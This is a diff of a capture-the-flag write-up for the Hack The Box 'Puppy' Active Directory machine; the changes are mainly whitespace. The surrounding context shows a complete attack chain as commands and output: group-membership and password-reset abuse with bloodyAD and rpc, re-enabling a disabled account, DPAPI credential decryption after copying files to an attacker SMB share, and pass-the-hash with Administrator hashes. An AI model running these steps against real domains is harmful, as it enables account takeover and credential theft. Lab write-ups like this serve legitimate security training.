@@ -179,6 +179,7 @@ So our account `levi.james` is a member of `HR@PUPPY.HTB` group and has **Generi
 
 **There are two ways to do this:**
 1. Use [ldap-addusers-group](https://docs.oracle.com/en/operating-systems/oracle-linux/6/admin/ldap-addusers-group.html) which need to have `modify.ldif` file and then use `ldapmodify` to configure the changes.
+
 ```bash
 └─$ cat modify.ldif 
 dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
@@ -186,10 +187,12 @@ changetype: modify
 add: member
 member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
 ```
+
 ```bash
 └─$ ldapmodify -x -H ldap://10.10.11.70 -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f modify.ldif
 modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"
 ```
+
 ```bash
 └─$ smbclient -U 'puppy.htb/levi.james%KingofAkron2025!' //10.10.11.70/DEV                            
 Try "help" to get a list of possible commands.
@@ -203,9 +206,11 @@ smb: \> dir
                 5080575 blocks of size 4096. 1522760 blocks available
 smb: \>
 ```
+
 &rarr; We can access the `DEV` share and read stuffs inside.
 
 2. Use [bloodyAD](https://github.com/CravateRouge/bloodyAD) to add the user to the group.
+
 ```bash
 └─$ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
 [+] levi.james added to DEVELOPERS
@@ -383,22 +388,29 @@ Found out that `ant.edwards` is a member of `SENIOR DEVS@PUPPY.HTB` group and ha
 
 **There are some ways to do this:**
 1. Use `bloodyAD` to change the password of `ADAM.SILVER@PUPPY.HTB`.
+
 ```bash
 └─$ bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'P@ssw4rd123'
 [+] Password changed successfully!
 ```
+
 Check again with `crackmapexec` to see if we can access the machine.
+
 ```bash
 └─$ sudo crackmapexec smb PUPPY.HTB -u 'ADAM.SILVER' -p 'P@ssw4rd123'
 SMB         PUPPY.HTB       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
 SMB         PUPPY.HTB       445    DC               [-] PUPPY.HTB\ADAM.SILVER:P@ssw4rd123 STATUS_ACCOUNT_DISABLED
 ```
+
 We got `STATUS_ACCOUNT_DISABLED` error, we need to activate it again.
+
 ```bash
 └─$ bloodyAD --host DC.PUPPY.HTB -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
 [-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
 ```
+
 And also need to modified `modify.ldif` again and use `ldapmodify` to mofidy the entry.
+
 ```bash
 └─$ cat modify.ldif 
 dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
@@ -406,15 +418,18 @@ changetype: modify
 replace: userAccountControl
 userAccountControl: 512
 ```
+
 ```bash
 └─$ ldapmodify -x -H ldap://10.10.11.70 -D "ant.edwards@puppy.htb" -w 'Antman2025!' -f modify.ldif
 modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"
 ```
+
 ```bash
 └─$ sudo crackmapexec smb PUPPY.HTB -u 'ADAM.SILVER' -p 'P@ssw4rd123'                                                 
 SMB         PUPPY.HTB       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
 SMB         PUPPY.HTB       445    DC               [+] PUPPY.HTB\ADAM.SILVER:P@ssw4rd123
 ```
+
 ```bash
 └─$ sudo crackmapexec winrm 10.10.11.70 -u 'ADAM.SILVER' -p 'P@ssw4rd123' -d PUPPY.HTB            
 HTTP        10.10.11.70     5985   10.10.11.70      [*] http://10.10.11.70:5985/wsman
@@ -439,10 +454,13 @@ Info: Establishing connection to remote endpoint
 ```
 
 2. Use [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) through `rpc`.
+
 ```bash
 └─$ net rpc password 'adam.silver' 'P@ssw4rd123' -U 'PUPPY.HTB'/'ant.edwards'%'Antman2025!' -S '10.10.11.70'
 ```
+
 or we can
+
 ```bash
 └─$ rpcclient -U 'puppy.htb\Ant.Edwards%Antman2025!' 10.10.11.70
 rpcclient $> setuserinfo adam.silver 23 P@ssw4rd123
@@ -450,6 +468,7 @@ rpcclient $>
 ```
 
 After `evil-winrm` login, we can found the `user.txt` flag.
+
 ```bash
 *Evil-WinRM* PS C:\Users\adam.silver\Desktop> dir
 
@@ -521,6 +540,7 @@ Info: Download successful!
 ```
 
 We found a `site-backup-2024-12-30.zip` file, download and check inside.
+
 ```bash
 └─$ tree .                        
 .
@@ -577,6 +597,7 @@ We found a `site-backup-2024-12-30.zip` file, download and check inside.
 ```
 
 Hmm, `nms-auth-config.xml.bak` file looks interesting, let's `cat` it out.
+
 ```bash
 └─$ cat nms-auth-config.xml.bak 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -665,6 +686,7 @@ Got the **master key** `556a2412-1275-4ccf-b721-e6a0b4f90407`, put that aside an
 
 Found a `C8D69EBE9A43E9DEBF6B5FBD48B521B9` file. <br>
 In order to transfer the **master key** and **DPAPI-protected data** to our attacking machine, we use `impacket-smbserver` to transfer the files.
+
 ```bash
 └─$ sudo impacket-smbserver share ./ -smb2support
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -683,6 +705,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Closing down connection (10.10.11.70,53298)
 [*] Remaining connections []
 ```
+
 ```bash
 *Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 \\10.10.14.38\share
 
@@ -690,6 +713,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 Now we have all the files we need, let's extract the credentials.
+
 ```bash
 └─$ python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -707,6 +731,7 @@ DomainKeyLen: 00000174 (372)
 Decrypted key with User Key (MD4 protected)
 Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
 ```
+
 ```bash
 └─$ python3 /usr/share/doc/python3-impacket/examples/dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -726,6 +751,7 @@ Unknown     : FivethChipOnItsWay2025!
 &rarr; Found password `FivethChipOnItsWay2025!` for `steph.cooper_adm`.
 
 Use `BloodHound` again.
+
 ```bash
 └─$ bloodhound-python -dc DC.PUPPY.HTB -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
@@ -827,6 +853,7 @@ DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795
 DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
 DC$:des-cbc-md5:7f044607a8dc9710
 ```
+
 ```bash
 └─$ sudo crackmapexec winrm 10.10.11.70 -u 'Administrator' -H 'bb0edc15e49ceb4120c7bd7e6e65d75b' -d PUPPY.HTB
 HTTP        10.10.11.70     5985   10.10.11.70      [*] http://10.10.11.70:5985/wsman
